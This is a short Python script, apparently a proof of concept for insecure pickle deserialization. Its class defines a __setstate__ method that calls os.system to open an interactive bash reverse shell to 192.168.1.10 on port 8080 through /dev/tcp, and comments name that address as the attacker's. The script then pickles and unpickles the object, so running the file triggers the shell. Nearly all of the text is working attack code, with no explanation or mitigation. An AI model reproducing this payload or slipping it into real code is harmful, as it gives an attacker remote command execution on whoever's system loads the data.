import pickle
import os


class foobar:
    def __init__(self):
        pass

    def __getstate__(self):
        return self.__dict__

    def __setstate__(self, state):
        # The attack is from 192.168.1.10
        # The attacker is listening on port 8080
        os.system('/bin/bash -c '
                  '"/bin/bash -i >& /dev/tcp/192.168.1.10/8080 0>&1"')


user_foobar = foobar()
user_pickle = pickle.dumps(user_foobar)
user_unpickle = pickle.loads(user_pickle)
